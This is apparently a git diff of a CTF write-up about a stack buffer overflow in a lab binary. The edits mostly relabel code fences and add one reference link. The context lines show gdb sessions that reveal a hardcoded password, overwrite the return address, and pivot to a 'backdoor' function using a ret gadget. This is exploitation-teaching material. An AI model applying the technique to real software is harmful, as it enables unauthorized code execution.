@@ -139,7 +139,7 @@ Looking the function in line `+38` call `gets@plt` and in line `+60` call `strcm
 
 Looking the program in `gdb` I found one interesting function named `backdoor`:
 
-```assembly
+```bash
 pwndbg> i functions
 All defined functions:
 
@@ -290,7 +290,7 @@ Let's do this inside `gdb`. For this I change the python script for send `150 A'
 
 
 
-```assembly
+```bash
 pwndbg> disassemble remote_system_health_check
 Dump of assembler code for function remote_system_health_check:
    0x0000000000401267 <+0>:	push   rbp
@@ -326,7 +326,7 @@ Breakpoint 1 at 0x40128d
 
 
 
-```assembly
+```bash
 pwndbg> r < a.txt
 Starting program: /pwd/system_health_check < a.txt
 Enter password to get system details:
@@ -386,7 +386,7 @@ pwndbg>
 
  Set another breakpoint in `strcmp` (`remote_system_health_check+60>`) an type `c`:
 
-```assembly
+```bash
 ► 0x4012a3 <remote_system_health_check+60>    call   strcmp@plt <strcmp@plt>
         s1: 0x7fffffffe480 ◂— 'sUp3r_S3cr3T_P4s5w0rD'
         s2: 0x402067 ◂— 'sUp3r_S3cr3T_P4s5w0rD'
@@ -424,7 +424,7 @@ The string `s1` and `s2` are equal, so the program will follow the normal flow r
 
 
 
-```assembly
+```bash
 pwndbg> c
 Continuing.
 Access Granted
@@ -484,7 +484,7 @@ Ops. Nothing of buffer overflow.  Why ? The answer is in the first lines - The `
 
 
 
-```assembly
+```bash
 pwndbg> set follow-fork-mode parent
 pwndbg>
 pwndbg> r < a.txt
@@ -596,7 +596,7 @@ if __name__ == "__main__":
 
 Running the script I  have:
 
-```assembly
+```bash
  RSP  0x7fffffffe588 ◂— 'aclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac'
  RIP  0x4012dd (remote_system_health_check+118) ◂— ret
 ─────────────────────────────────────[ DISASM ]───────────────────────────────────
@@ -623,7 +623,7 @@ Lets check  this again. Now send `242 A's` and `8 B's`:
 
 ```
 
-```assembly
+```bash
  RSP  0x7fffffffe588 ◂— 'BBBBBBBB'
  RIP  0x4012dd (remote_system_health_check+118) ◂— ret
 ──────────────────────────[ DISASM ]─────────────────────────────────────────────────────
@@ -684,7 +684,7 @@ if __name__ == "__main__":
 
  Before, put a breakpoint in `backdoor` function:
 
-```assembly
+```bash
 pwndbg> disassemble backdoor
 Dump of assembler code for function backdoor:
    0x0000000000401254 <+0>:	push   rbp
@@ -702,7 +702,7 @@ pwndbg>
 
 
 
-```assembly
+```bash
 pwndbg> r < a.txt
 Starting program: /pwd/system_health_check < a.txt
 Enter password to get system details:
@@ -732,7 +732,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 
 I  have success in redirect flow execution of program. Type `c` to continue:
 
- ````assembly
+ ````bash
 pwndbg> c
 Continuing.
 
@@ -792,7 +792,7 @@ Google it  ` movaps xmmword ptr [rsp + 0x50], xmm0`   gave me the answer .
 
 So I have to aligned the stack before call *backdoor* function. What instruction do that its for me ? The `RET` instruction does this for me. Let me found one:
 
-```assembly
+```bash
 python3 ROPgadget.py  --only "ret" --binary /pwd/system_health_check
 Gadgets information
 ============================================================
@@ -885,6 +885,7 @@ LO{THIS_IS_TEST_FLAG}$
 
 
 
+- https://www.youtube.com/watch?v=OqTpc_ljPYk
 - https://ctf101.org/binary-exploitation/relocation-read-only/
 - https://www.felixcloutier.com/x86/ret
 - http://blog.binpang.me/2019/07/12/stack-alignment/
